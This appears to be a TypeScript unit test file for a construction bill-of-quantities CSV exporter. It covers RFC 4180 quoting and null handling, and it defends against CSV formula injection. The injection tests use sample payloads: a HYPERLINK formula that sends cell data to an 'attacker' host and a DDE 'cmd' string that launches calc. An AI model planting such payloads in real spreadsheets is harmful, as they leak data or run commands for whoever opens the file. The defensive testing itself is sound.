// Unit tests for toBoqCsv — RFC 4180 escaping, null handling, category lookup (100% line+branch).

import { toBoqCsv } from '../boq-csv.util';
import type { BoqVersionRow, BoqCategoryRow, BoqItemRow } from '../boq.repository';

const version = { version_number: 3 } as BoqVersionRow;

const category = {
  category_id: 'cat-1',
  category_code: 'CAT-01',
  category_name: 'Concrete',
} as BoqCategoryRow;

function makeItem(overrides: Partial<BoqItemRow> = {}): BoqItemRow {
  return {
    item_id: 'item-1',
    category_id: 'cat-1',
    version_id: 'v-1',
    tenant_id: 't-1',
    item_code: 'ITM-01',
    description: 'Cement bag',
    unit: 'bag',
    quantity: '10.0000',
    unit_cost: '150.0000',
    estimated_total: '1500.0000',
    currency_code: 'THB',
    sort_order: 0,
    carbon_factor_kg_co2e: '0.500000',
    carbon_total_kg_co2e: '5.0000',
    created_at: new Date('2026-07-05'),
    updated_at: new Date('2026-07-05'),
    ...overrides,
  };
}

describe('toBoqCsv', () => {
  it('emits a header row and one row per item, CRLF-terminated', () => {
    const csv = toBoqCsv(version, [category], [makeItem()]);
    const lines = csv.split('\r\n');
    expect(lines).toHaveLength(2);
    expect(lines[0]).toBe(
      'version_number,category_code,category_name,item_code,description,unit,quantity,unit_cost,estimated_total,currency_code,carbon_factor_kg_co2e,carbon_total_kg_co2e',
    );
    expect(lines[1]).toBe(
      '3,CAT-01,Concrete,ITM-01,Cement bag,bag,10.0000,150.0000,1500.0000,THB,0.500000,5.0000',
    );
  });

  it('returns only the header row when there are no items', () => {
    const csv = toBoqCsv(version, [category], []);
    expect(csv.split('\r\n')).toHaveLength(1);
  });

  it('escapes fields containing commas, quotes and newlines (RFC 4180)', () => {
    const csv = toBoqCsv(
      version,
      [category],
      [makeItem({ description: 'Rebar, 12mm "grade B"\nsecond line' })],
    );
    const row = csv.split('\r\n')[1]!;
    expect(row).toContain('"Rebar, 12mm ""grade B""\nsecond line"');
  });

  it('renders null fields (item_code / carbon) as empty', () => {
    const csv = toBoqCsv(
      version,
      [category],
      [makeItem({ item_code: null, carbon_factor_kg_co2e: null, carbon_total_kg_co2e: null })],
    );
    const row = csv.split('\r\n')[1]!;
    // item_code empty (between version fields and description); trailing carbon fields empty
    expect(row).toBe('3,CAT-01,Concrete,,Cement bag,bag,10.0000,150.0000,1500.0000,THB,,');
  });

  it('leaves category columns empty when the item category is not in the map', () => {
    const csv = toBoqCsv(version, [], [makeItem({ category_id: 'orphan' })]);
    const row = csv.split('\r\n')[1]!;
    expect(row.startsWith('3,,,ITM-01,')).toBe(true);
  });

  // ── CSV formula injection (CWE-1236) ──────────────────────────────────────
  // description/item_code/unit are tenant-authored free text and this file is downloaded and opened
  // in a spreadsheet. RFC 4180 quoting alone does not stop evaluation — the quotes are stripped first.

  it.each([
    ['=HYPERLINK("http://attacker/?d="&A1,"Open")'],
    ['@SUM(A1:A9)'],
    ['\tcmd'],
    ["-1+1+cmd|'/c calc'!A0"],
    ['+1+1'],
  ])('neutralises the formula trigger in %s', (payload) => {
    const csv = toBoqCsv(version, [category], [makeItem({ description: payload })]);
    const row = csv.split('\r\n')[1]!;
    // Quoted and apostrophe-prefixed → the spreadsheet renders it as literal text.
    expect(row).toContain(`"'${payload.replace(/"/g, '""')}"`);
  });

  it('leaves signed numbers alone — escaping them would break the export as data', () => {
    const csv = toBoqCsv(
      version,
      [category],
      [makeItem({ unit_cost: '-150.0000', carbon_factor_kg_co2e: '+0.500000' })],
    );
    const row = csv.split('\r\n')[1]!;
    expect(row).toContain(',-150.0000,');
    expect(row).toContain(',+0.500000,');
    expect(row).not.toContain("'");
  });

  it('still applies plain RFC 4180 quoting to non-formula text', () => {
    const csv = toBoqCsv(version, [category], [makeItem({ description: 'Rebar, 12mm' })]);
    expect(csv.split('\r\n')[1]!).toContain('"Rebar, 12mm"');
    expect(csv).not.toContain("'");
  });
});
